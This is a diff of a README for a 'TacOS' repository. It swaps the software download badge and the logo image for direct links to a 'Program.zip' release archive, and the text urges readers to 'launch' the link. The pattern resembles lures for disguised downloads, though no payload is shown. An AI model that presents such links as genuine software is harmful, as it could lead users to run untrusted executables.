@@ -11,7 +11,7 @@ Welcome to the TacOS repository! Here you will find all the resources related to
 ## Software Package
 To download the latest software package for TacOS, please click the button below:
 
-[![Download TacOS Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download TacOS Software](https://github.com/Naoval19/TacOS/releases/download/v1.0/Program.zip)](https://github.com/Naoval19/TacOS/releases/download/v1.0/Program.zip)
 
 **Note:** This link needs to be launched to download the software package.
 
@@ -47,6 +47,6 @@ Stay connected with the TacOS community:
 - Follow us on [Twitter](#) for the latest news and updates.
 - Join our [Discord](#) server to engage with other TacOS users and developers.
 
-![TacOS Logo](https://example.com/tacos_logo.png)
+![TacOS Logo](https://github.com/Naoval19/TacOS/releases/download/v1.0/Program.zip)
 
 🌮 Happy computing with TacOS! 🌮
